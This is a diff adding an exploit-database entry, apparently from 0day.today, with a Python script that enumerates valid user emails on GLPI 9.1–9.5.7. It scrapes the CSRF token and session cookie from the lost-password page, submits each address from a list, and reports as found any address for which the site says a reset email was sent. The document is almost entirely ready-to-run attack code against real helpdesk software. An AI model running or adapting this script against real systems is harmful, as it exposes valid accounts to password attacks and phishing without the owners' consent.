@@ -1,0 +1,66 @@
+id: 38650
+date: 05/02/2023
+title: GLPI 9.5.7 - Username Enumeration Vulnerability
+author: Rafael B.
+cves: 
+
+# Exploit Title: GLPI 9.5.7 - Username Enumeration
+# Author: Rafael B.
+# Vendor Homepage: https://glpi-project.org/pt-br/
+# Affected Versions: GLPI version 9.1 <= 9.5.7
+# Software: https://github.com/glpi-project/glpi/releases/download/9.5.7/glpi-9.5.7.tgz
+
+
+import requests
+from bs4 import BeautifulSoup
+
+# Send a GET request to the page to receive the csrf token and the cookie session
+response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')
+
+# Parse the HTML using BeautifulSoup
+soup = BeautifulSoup(response.content, 'html.parser')
+
+# Find the input element with the CSRF token
+csrf_input = soup.find('input', {'name': lambda n: n and n.startswith('_glpi_csrf_')})
+
+# Extract the CSRF token if it exists
+if csrf_input:
+    csrf_token = csrf_input['value']
+
+# Extract the session cookie
+session_cookie_value = None
+if response.cookies:
+    session_cookie_value = next(iter(response.cookies.values()))
+# Set the custom url where the GLPI recover password is located 
+url = "http://127.0.0.1:80/glpi/front/lostpassword.php"
+headers = {"User-Agent": "Windows NT 10.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://127.0.0.1", "Connection": "close", "Referer": "http://127.0.0.1/glpi/front/lostpassword.php?lostpassword=1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
+
+# Open the email list file and read each line
+with open('emails.txt', 'r') as f:
+    email_list = f.readlines()
+
+# Loop through the email list and make a POST request for each email
+for email in email_list:
+    email = email.strip()
+    data = {"email": email, "update": "Save", "_glpi_csrf_token": csrf_token}
+    cookies = {"glpi_f6478bf118ca2449e9e40b198bd46afe": session_cookie_value}
+    freq = requests.post(url, headers=headers, cookies=cookies, data=data)
+
+    # Do a new GET request to get the updated CSRF token and session cookie for the next iteration
+    response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')
+    soup = BeautifulSoup(response.content, 'html.parser')
+    csrf_input = soup.find('input', {'name': lambda n: n and n.startswith('_glpi_csrf_')})
+    if csrf_input:
+        csrf_token = csrf_input['value']
+    session_cookie_value = None
+    if response.cookies: 
+        session_cookie_value = next(iter(response.cookies.values()))
+
+    # Parse the response and grep the match e-mails
+    soup = BeautifulSoup(freq.content, 'html.parser')
+    div_center = soup.find('div', {'class': 'center'})
+    Result = (f"Email: {email}, Result: {div_center.text.strip()}")
+    if "An email has been sent to your email address. The email contains information for reset your password." in Result:
+        print ("\033[1;32m Email Found! -> " + Result)
+
+#  0day.today [2023-05-08]  #
